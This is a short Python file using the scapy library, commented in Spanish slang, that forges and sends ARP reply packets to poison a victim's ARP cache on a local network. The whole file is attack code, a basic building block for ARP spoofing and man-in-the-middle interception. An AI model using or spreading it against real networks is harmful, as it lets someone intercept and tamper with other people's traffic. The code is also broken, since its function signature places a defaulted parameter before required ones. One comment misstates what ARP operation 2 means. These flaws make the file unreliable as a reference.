from scapy.all import *

def crear_paquete_arp_fake(operacion_tipo=2, ip_victima, mac_victima, 
                           ip_atacante, mac_atacante):
  """Crea y manda un paquete fake de arp para chuzarselo al cliente
  
      Args:
        operacion_tipo (int): Tipo de paquetada. "2 significa que es un paquete ARP"
        ip_victima (str): IP de la victima. "192.168.0.2"
        mac_victima (str): MAC de la victima. "00:00:00:00:00:00"
        ip_atacante (str): ip fake del pirania "192.168.0.66"
        mac_atacante (str): MAC del pirania. "00:00:00:00:00:00"
        Si la mac del atacante se cambia a fake ejemplo poner la invisible 00:00:00:00:00:00
        poner la fake ;D.
  """
  
  arp_response = ARP() # Instancia de la paquetada padre.
  # print(arp_response.show())
  
  arp_response.op = operacion_tipo
  arp_response.pdst = ip_victima
  arp_response.hwdst = mac_victima
  arp_response.psrc = ip_atacante 
  arp_response.hwsrc =  mac_atacante
  
  # print(arp_response.show())
  
  return arp_response

def mandar_paquete_arp(paquetada):
  """Manda el paquete a la victima
     Ejecutando la mitica espufeada padre.
     
     Args:
      paquetada (scapy.all.ARP): El paquete ARP generado con crear_paquete_arp_fake.
  """
  send(paquetada)
  
  return None  
